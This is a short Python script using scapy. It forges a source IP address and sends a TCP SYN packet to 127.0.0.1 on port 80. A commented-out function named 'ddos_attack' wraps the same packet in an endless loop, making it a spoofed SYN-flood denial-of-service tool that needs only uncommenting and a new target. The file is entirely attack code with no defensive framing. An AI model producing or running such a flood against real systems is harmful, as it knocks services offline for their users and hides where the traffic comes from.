from scapy.all import IP, TCP, send

spoofed_ip = "192.0.2.1"
target_ip = "127.0.0.1"
target_port = 80

# def ddos_attack():
#     while True:
#         ip = IP(src=spoofed_ip, dst=target_ip)
#         tcp = TCP(sport=12345, dport=target_port, flags="S")
#         packet = ip / tcp
#         send(packet, verbose=0)
#         print(f"Packet sent from spoofed IP: {spoofed_ip} to {target_ip}:{target_port}")

# ddos_attack()

ip = IP(src=spoofed_ip, dst=target_ip)
tcp = TCP(sport=12345, dport=target_port, flags="S")
packet = ip / tcp
send(packet, verbose=0)
print(f"Packet sent from spoofed IP: {spoofed_ip} to {target_ip}:{target_port}")